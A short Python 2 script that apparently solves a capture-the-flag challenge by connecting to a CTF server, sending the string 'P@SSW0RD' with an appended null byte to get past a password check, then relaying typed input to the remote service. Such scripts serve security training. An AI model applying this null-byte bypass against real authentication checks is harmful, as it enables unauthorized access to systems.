from socket import *

stringToWin = "P@SSW0RD\x00\n"

hostAddr = ("pwn1.chal.ctf.westerns.tokyo", 12345)

sock = socket(AF_INET)
sock.connect(hostAddr)

print sock.recv(1024)
print stringToWin

sock.send(stringToWin)
print sock.recv(1024)

usrInput = ""

while usrInput != "END":
	usrInput = raw_input(">")
	sock.send(usrInput)
	print sock.recv(1024)

sock.close()